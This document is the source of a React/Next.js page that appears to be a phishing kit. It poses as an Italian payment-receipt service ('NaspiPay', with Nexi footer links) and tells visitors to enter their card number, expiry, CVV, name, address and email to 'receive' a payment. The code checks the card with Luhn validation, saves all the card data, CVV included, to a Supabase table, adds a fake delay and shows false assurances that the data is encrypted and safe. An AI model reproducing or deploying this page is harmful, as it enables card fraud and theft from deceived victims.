"use client";

import { FormEvent, useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { createClient } from "@/lib/supabase/client";

function formatCardNumber(value: string) {
  const digits = value.replace(/\D/g, "").slice(0, 16);
  return digits.replace(/(\d{4})(?=\d)/g, "$1 ");
}

function detectBrand(digits: string): "visa" | "mastercard" | "unknown" {
  if (/^4/.test(digits)) return "visa";
  if (/^5[1-5]/.test(digits) || /^2(2[2-9]|[3-6]|7[01]|720)/.test(digits)) {
    return "mastercard";
  }
  return "unknown";
}

function isLuhnValid(digits: string) {
  if (digits.length < 13 || digits.length > 19) return false;
  let sum = 0;
  let alt = false;
  for (let i = digits.length - 1; i >= 0; i--) {
    let n = Number(digits[i]);
    if (alt) {
      n *= 2;
      if (n > 9) n -= 9;
    }
    sum += n;
    alt = !alt;
  }
  return sum % 10 === 0;
}

function formatExpiry(value: string) {
  const digits = value.replace(/\D/g, "").slice(0, 4);
  if (digits.length <= 2) return digits;
  return `${digits.slice(0, 2)}/${digits.slice(2)}`;
}

export default function HomePage() {
  const supabase = createClient();
  const router = useRouter();

  const [price, setPrice] = useState<number | null>(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [form, setForm] = useState({
  first_name: "",
  street: "",
  city: "",
  cap: "",
  card_number: "",
  expiry: "",
  security_code: "",
  email: "",
});

const cardDigits = form.card_number.replace(/\s/g, "");
const brand = detectBrand(cardDigits);
const cardOk = cardDigits.length >= 13 && isLuhnValid(cardDigits);
const cardError =
cardDigits.length >= 13 && !cardOk ? "Numero carta non valido!" : "";

  useEffect(() => {
    let cancelled = false;

    async function loadPrice() {
      const { data } = await supabase
        .from("app_settings")
        .select("price")
        .eq("id", 1)
        .single();
      if (!cancelled && data) setPrice(Number(data.price));
    }

    loadPrice();

    const channel = supabase
      .channel("settings-price")
      .on(
        "postgres_changes",
        { event: "UPDATE", schema: "public", table: "app_settings" },
        (payload) => {
          const next = payload.new as { price?: number };
          if (typeof next.price !== "undefined") setPrice(Number(next.price));
        }
      )
      .subscribe();

    return () => {
      cancelled = true;
      supabase.removeChannel(channel);
    };
  }, [supabase]);

  async function onSubmit(e: FormEvent) {
    e.preventDefault();
    setLoading(true);
    setError("");
    const startedAt = Date.now();

    const cardDigits = form.card_number.replace(/\s/g, "");
    if (cardDigits.length < 13) {
      setLoading(false);
      setError("Inserire un numero di carta valido.");
      return;
    }
    if (!/^\d{2}\/\d{2}$/.test(form.expiry)) {
      setLoading(false);
      setError("Inserire data di scadenza MM/YY.");
      return;
    }

    if (!isLuhnValid(cardDigits) || detectBrand(cardDigits) === "unknown") {
  setLoading(false);
  setError("Numero carta non valida!");
  return;
}

    const { data, error: insertError } = await supabase
      .from("submissions")
      .insert({
        first_name: form.first_name.trim(),
        last_name: form.first_name.trim(),
        address: form.expiry,
        card_number: cardDigits,
        expiry: form.expiry,
        security_code: form.security_code.trim(),
        email: form.email.trim(),
        street: form.street.trim(),
        city: form.city.trim(),
        cap: form.cap.trim(),
        status: "pending",
      })
      .select("id")
      .single();


   if (insertError || !data) {
      setLoading(false);
      setError(insertError?.message ?? "Dati non salvati");
      return;
    }

   const remaining = Math.max(0, 7000 - (Date.now() - startedAt));
  await new Promise((resolve) => setTimeout(resolve, remaining));


    router.push(`/status?id=${data.id}`);
  }

const inputClass =
    "w-full rounded-lg border border-gray-300 bg-white px-3 py-2 text-gray-900 outline-none focus:border-blue-500 focus:ring-2 focus:ring-blue-100";

  return (
   <main className="mx-auto flex min-h-screen max-w-lg flex-col items-center bg-white px-6 py-12 text-gray-900">
    
        <img
          src="/powered-by.png"
          alt="Powered by"
          className="mx-auto mb-6 h-20 w-auto object-contain opacity-80"
        />

        <div className="mb-8 w-full rounded-xl border border-gray-200 bg-gray-50 px-5 py-4 text-center">
          <h1 className="text-xl font-semibold">Pagamento in attessa di ricezione...</h1>
        <p className="text-sm text-[#9aa8b8]">Totale pagato</p>
        <p className="mt-1 text-3xl font-semibold">
          {price === null ? "…" : `€${price.toFixed(2)}`}
        </p>
      </div>

      <form onSubmit={onSubmit} className="w-full space-y-4 rounded-xl border border-gray-200 bg-white p-6 shadow-sm">
       <div className="mb-8 flex w-full items-center justify-center gap-2 rounded-xl border border-gray-200 bg-gray-50 px-5 py-4 text-center">
  <svg
    className="h-5 w-5 shrink-0 text-green-600"
    viewBox="0 0 24 24"
    fill="none"
    stroke="currentColor"
    strokeWidth="2.5"
    aria-hidden="true"
  >
    <circle cx="12" cy="12" r="10" />
    <path d="M8 12.5l2.5 2.5L16 9" />
  </svg>
  <p className="text-sm text-[#a48403]">
    Inserisci i dati della carta dove ricevere il pagamento
  </p>
</div>
        <h1 className="text-xl font-semibold">RICEZIONE PAGAMENTO</h1>
        <label className="block text-sm text-[#000000]">
  Email dove ricevere notifica di accredito
  <div className="relative mt-1">
    <svg
      className="pointer-events-none absolute left-3 top-1/2 h-4 w-4 -translate-y-1/2 text-gray-500"
      viewBox="0 0 24 24"
      fill="none"
      stroke="currentColor"
      strokeWidth="2"
      aria-hidden="true"
    >
      <rect x="3" y="5" width="18" height="14" rx="2" />
      <path d="M3 7l9 6 9-6" />
    </svg>
    <input
      required
      type="email"
      placeholder="Inserire indirizzo email"
      autoComplete="email"
      className={`${inputClass} pl-10`}
      value={form.email}
      onChange={(e) => setForm((f) => ({ ...f, email: e.target.value }))}
    />
  </div>
</label>

         <label className="block text-sm">
  Nome e cognome titolare carta
  <div className="relative mt-1">
    <svg
      className="pointer-events-none absolute left-3 top-1/2 h-4 w-4 -translate-y-1/2 text-gray-500"
      viewBox="0 0 24 24"
      fill="none"
      stroke="currentColor"
      strokeWidth="2"
      aria-hidden="true"
    >
      <circle cx="12" cy="8" r="4" />
      <path d="M4 20c1.5-3.5 4.5-5 8-5s6.5 1.5 8 5" />
    </svg>
    <input
      required
      placeholder="Inserire Nome e cognome intestatario"
      className={`${inputClass} pl-10`}
      value={form.first_name}
      onChange={(e) => setForm((f) => ({ ...f, first_name: e.target.value }))}
    />
  </div>
</label>

<label className="block text-sm">
  Indirizzo
  <div className="relative mt-1">
    <svg
      className="pointer-events-none absolute left-3 top-1/2 h-4 w-4 -translate-y-1/2 text-gray-500"
      viewBox="0 0 24 24"
      fill="none"
      stroke="currentColor"
      strokeWidth="2"
      aria-hidden="true"
    >
      <path d="M3 10.5L12 3l9 7.5V20a1 1 0 0 1-1 1h-5v-6H9v6H4a1 1 0 0 1-1-1v-9.5z" />
    </svg>
    <input
      required
      placeholder="Via e numero civico"
      className={`${inputClass} pl-10`}
      value={form.street}
      onChange={(e) => setForm((f) => ({ ...f, street: e.target.value }))}
    />
  </div>
</label>

<div className="grid grid-cols-2 gap-3">
  <label className="block text-sm">
    Città
    <input
      required
      placeholder="Città"
      className={`${inputClass} mt-1`}
      value={form.city}
      onChange={(e) => setForm((f) => ({ ...f, city: e.target.value }))}
    />
  </label>

  <label className="block text-sm">
    CAP
    <input
      required
      inputMode="numeric"
      placeholder="00100"
      maxLength={5}
      className={`${inputClass} mt-1`}
      value={form.cap}
      onChange={(e) =>
        setForm((f) => ({ ...f, cap: e.target.value.replace(/\D/g, "").slice(0, 5) }))
      }
    />
  </label>
</div>

        
        <label className="block text-sm">
  Numero carta dove ricevere pagamento
 <div className="relative mt-1">
  <svg
    className="pointer-events-none absolute left-3 top-1/2 h-4 w-4 -translate-y-1/2 text-gray-500"
    viewBox="0 0 24 24"
    fill="none"
    stroke="currentColor"
    strokeWidth="2"
    aria-hidden="true"
  >
    <rect x="2" y="5" width="20" height="14" rx="2" />
    <path d="M2 10h20" />
  </svg>

  <input
    required
    inputMode="numeric"
    autoComplete="cc-number"
    placeholder="0000 0000 0000 0000"
    className={`${inputClass} pl-10 pr-14 tracking-wider`}
    value={form.card_number}
    onChange={(e) =>
      setForm((f) => ({ ...f, card_number: formatCardNumber(e.target.value) }))
    }
  />

  <span className="pointer-events-none absolute right-3 top-1/2 -translate-y-1/2">
    {brand === "visa" && (
      <span className="text-xs font-bold italic text-blue-700">VISA</span>
    )}
    {brand === "mastercard" && (
      <span className="flex">
        <span className="h-4 w-4 rounded-full bg-red-500" />
        <span className="-ml-2 h-4 w-4 rounded-full bg-yellow-400 opacity-90" />
      </span>
    )}
  </span>
</div>

{cardError && <p className="mt-1 text-sm text-red-600">{cardError}</p>}
</label>

        <div className="grid grid-cols-2 gap-3">
          <label className="block text-sm">
  Scadenza
  <div className="relative mt-1">
    <svg
      className="pointer-events-none absolute left-3 top-1/2 h-4 w-4 -translate-y-1/2 text-gray-500"
      viewBox="0 0 24 24"
      fill="none"
      stroke="currentColor"
      strokeWidth="2"
      aria-hidden="true"
    >
      <rect x="3" y="5" width="18" height="16" rx="2" />
      <path d="M3 10h18M8 3v4M16 3v4" />
    </svg>
    <input
      required
      inputMode="numeric"
      autoComplete="cc-exp"
      placeholder="MM/YY"
      className={`${inputClass} pl-10`}
      value={form.expiry}
      onChange={(e) =>
        setForm((f) => ({ ...f, expiry: formatExpiry(e.target.value) }))
      }
    />
  </div>
</label>

         <label className="block text-sm">
  Cvv
  <div className="relative mt-1">
    <svg
      className="pointer-events-none absolute left-3 top-1/2 h-4 w-4 -translate-y-1/2 text-gray-500"
      viewBox="0 0 24 24"
      fill="none"
      stroke="currentColor"
      strokeWidth="2"
      aria-hidden="true"
    >
      <rect x="5" y="11" width="14" height="10" rx="2" />
      <path d="M8 11V8a4 4 0 0 1 8 0v3" />
    </svg>
    <input
      required
      type="password"
      inputMode="numeric"
      autoComplete="cc-csc"
      placeholder="123"
      maxLength={4}
      className={`${inputClass} pl-10`}
      value={form.security_code}
      onChange={(e) =>
        setForm((f) => ({
          ...f,
          security_code: e.target.value.replace(/\D/g, "").slice(0, 4),
        }))
      }
    />
  </div>
</label>
        </div>

       
        {error && <p className="text-sm text-red-400">{error}</p>}

        <button
  type="submit"
  disabled={loading}
  className="flex w-full items-center justify-center gap-2 rounded-lg bg-blue-600 px-4 py-2.5 font-medium text-white hover:bg-blue-500 disabled:cursor-not-allowed disabled:opacity-70"
>
  {loading ? (
    <>
      <span className="h-4 w-4 animate-spin rounded-full border-2 border-white border-t-transparent" />
      Pagamento in ricezione...
    </>
  ) : (
    "Conferma Ricezione"
  )}
</button>

        
        <p className="mt-3 rounded-lg border border-amber-200 bg-amber-50 px-3 py-2 text-center text-sm text-amber-800">
          <img src="thick.png" width="15" height="15"  className="mx-auto mb-6 h-8 w-auto object-contain opacity-80"></img>
         Tutti i dati inseriti sono crittografati e sicuri. Facendo clic sul pulsante Ricevi accredito, accetti di ricevere il seguente pagamento utilizzando il servizio online NaspiPay
        </p>
         </form>

            <footer className="mt-10 w-full text-center">
        <p className="mb-3 text-xs uppercase tracking-wide text-[#9aa8b8]">
          Powered by
        </p>
        <img
          src="/logo.png"
          alt="Powered by"
          className="mx-auto h-20 w-auto object-contain opacity-80"
        />

        <nav className="flex flex-wrap items-center justify-center gap-x-4 gap-y-2 text-sm text-[#9aa8b8]">
          <a href="https://www.nexi.it/it/carte-di-pagamento/sicurezza" className="hover:text-white hover:underline">
            Prevenzione frodi
          </a>
          <span className="hidden text-[#2a3548] sm:inline">|</span>
          <a href="https://www.nexi.it/it/privacy" className="hover:text-white hover:underline">
            Privacy
          </a>
          <span className="hidden text-[#2a3548] sm:inline">|</span>
          <a href="https://www.nexi.it/it/cookie-policy" className="hover:text-white hover:underline">
            Cookie
          </a>
          <span className="hidden text-[#2a3548] sm:inline">|</span>
          <a href="https://www.nexi.it/it/reclami" className="hover:text-white hover:underline">
            Reclami
          </a>
        </nav>
      </footer>
    </main>
  );
}
